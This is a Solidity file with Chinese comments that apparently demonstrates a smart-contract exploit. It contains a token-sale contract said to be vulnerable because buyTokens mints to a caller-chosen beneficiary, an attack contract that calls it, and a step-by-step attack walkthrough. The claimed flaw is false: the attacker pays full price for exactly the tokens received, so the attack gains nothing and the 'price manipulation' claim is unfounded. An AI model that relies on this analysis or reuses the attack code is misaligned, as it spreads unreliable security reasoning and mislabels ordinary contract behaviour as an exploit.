pragma solidity >=0.8.0;

// 漏洞合約：錯誤時機鑄幣 (Wrong moment for token generation)
// 漏洞描述：
// 此合約在 buyTokens 函式中，直接根據傳入的 beneficiary 鑄造代幣，
// 而不強制檢查 beneficiary 必須與 msg.sender 相符。這使得攻擊者可以指定任意地址，
// 將代幣轉入該地址，進而操縱代幣的供應與價格。

contract VulnerableTokenSale {
    // 狀態變數：紀錄各地址的代幣餘額
    mapping(address => uint256) public balances;
    
    // 狀態變數：代幣售價，此處設為 1 ether 一枚代幣
    uint256 public tokenPrice = 1 ether;

    // buyTokens 函式中存在漏洞：直接依據參數 beneficiary 來鑄造代幣
    // 攻擊者可傳入自己的地址而非真實購買者地址，由此任意獲得代幣
    function buyTokens(address beneficiary) public payable {
        require(msg.value >= tokenPrice, "Insufficient Ether");
        
        // 此處為漏洞重點：token generation 依賴於外部傳入的 beneficiary 參數
        uint256 tokens = msg.value / tokenPrice;
        balances[beneficiary] += tokens; // 未檢查 beneficiary 是否為 msg.sender
    }
}

// 攻擊合約：利用上述漏洞進行攻擊
contract AttackVulnerable {
    VulnerableTokenSale public vulnerableSale;
    address public attacker;

    // 部署時指定 VulnerableTokenSale 合約地址
    constructor(address _vulnerableSale) {
        vulnerableSale = VulnerableTokenSale(_vulnerableSale);
        attacker = msg.sender;
    }

    // 攻擊步驟：
    // 1. 攻擊者部署 AttackVulnerable 合約，並指定漏洞合約地址
    // 2. 呼叫 attack 函式並傳入足夠的 Ether，並將 beneficiary 固定為攻擊者地址
    // 這樣不論誰呼叫 buyTokens，都會把代幣鑄造給攻擊者，從而操縱代幣價格
    function attack() public payable {
        require(msg.sender == attacker, "Not authorized");
        vulnerableSale.buyTokens{value: msg.value}(attacker);
    }

    // 查詢攻擊者在漏洞合約中的代幣餘額（僅作示範）
    function getMyTokens() public view returns (uint256) {
        return vulnerableSale.balances(attacker);
    }
}

/*
部署與攻擊流程說明：
1. 部署 VulnerableTokenSale 合約。
2. 部署 AttackVulnerable 合約，並在部署時傳入 VulnerableTokenSale 合約地址。
3. 攻擊者呼叫 AttackVulnerable 合約中的 attack 函式，傳入足夠的 Ether（至少 1 ether）。
   此時，漏洞合約的 buyTokens 函式會將代幣發送到 attacker 地址，而非呼叫者。
4. 攻擊者可以利用獲得的大量代幣，進一步操作市場，操縱代幣價格。
*/